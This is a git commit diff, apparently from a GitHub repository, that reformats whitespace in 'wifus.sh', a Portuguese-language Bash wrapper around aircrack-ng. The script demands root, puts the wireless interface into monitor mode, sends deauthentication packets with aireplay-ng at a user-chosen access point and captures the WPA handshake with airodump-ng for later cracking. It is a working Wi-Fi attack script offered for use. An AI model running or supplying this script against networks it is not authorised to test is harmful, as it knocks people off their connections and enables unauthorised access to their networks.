ea7cdfe310944492dfe9c67cd19401faf5cde301
Valurk <73291263+Valurk@users.noreply.github.com>
2022-01-29 22:17:50 -0300

    Update wifus.sh

--- wifus.sh
+++ wifus.sh
@@ -1,39 +1,40 @@
 #!/bin/bash
+
 RED='\033[01;31m'
 WHITE='\033[01;37m'
 echo -e "${RED}
- █     █░ ██▓  █████▒█    ██   ██████ 
-▓█░ █ ░█░▓██▒▓██   ▒ ██  ▓██▒▒██    ▒ 
-▒█░ █ ░█ ▒██▒▒████ ░▓██  ▒██░░ ▓██▄   
+ █     █░ ██▓  █████▒█    ██   ██████
+▓█░ █ ░█░▓██▒▓██   ▒ ██  ▓██▒▒██    ▒
+▒█░ █ ░█ ▒██▒▒████ ░▓██  ▒██░░ ▓██▄
 ░█░ █ ░█ ░██░░▓█▒  ░▓▓█  ░██░  ▒   ██▒
 ░░██▒██▓ ░██░░▒█░   ▒▒█████▓ ▒██████▒▒
 ░ ▓░▒ ▒  ░▓   ▒ ░   ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
   ▒ ░ ░   ▒ ░ ░     ░░▒░ ░ ░ ░ ░▒  ░ ░
-  ░   ░   ▒ ░ ░ ░    ░░░ ░ ░ ░  ░  ░  
-    ░     ░            ░           ░  
-                                       ${RED}""${WHITE} ${WHITE}"
+  ░   ░   ▒ ░ ░ ░    ░░░ ░ ░ ░  ░  ░
+    ░     ░            ░           ░
+${RED}""${WHITE} ${WHITE}"
 
 
 if [ "$EUID" -ne 0 ] #Verificando ROOT
 then printf "${WHITE}Execute o sofware como ROOT!\n ${WHITE}"
-  exit
+    exit
 fi
 
 if ! hash xterm 2>/dev/null; then
-  printf "${WHITE}Por Favor, Instale o Xterm${WHITE}"; exit 3
+    printf "${WHITE}Por Favor, Instale o Xterm${WHITE}"; exit 3
 fi
 
 if ! hash aircrack-ng 2>/dev/null; then
-  printf "${WHITE}Por Favor, Instale o aircrack-ng${WHITE}"; exit 3
+    printf "${WHITE}Por Favor, Instale o aircrack-ng${WHITE}"; exit 3
 fi
 
 
 if ["$1" == ""]
-then 	
-	printf "${WHITE}Desenvolvido por PatrickPanico Modo de uso: $0 Interface de rede\n${WHITE}";
-	sleep 2
-	exit
-fi	
+then
+    printf "${WHITE}Desenvolvido por PatrickPanico Modo de uso: $0 Interface de rede\n${WHITE}";
+    sleep 2
+    exit
+fi
 
 airmon-ng check kill "$1"
 clear
@@ -47,11 +48,4 @@ read -p "Digite o CANAL: " canal
 printf "${WHITE}Quando Capturar o handshake pressione ctrl+c\n${WHITE}"
 sleep 4
 xterm -geometry "100x60-0+0" -bg black -fg white -e "aireplay-ng -0 10 -a $bssid $1mon" > /dev/null 2>&1 &
-airodump-ng --bssid "$bssid" -c "$canal" -w captura "$1"mon 
-
-
-
-
-
-
-
+airodump-ng --bssid "$bssid" -c "$canal" -w captura "$1"mon
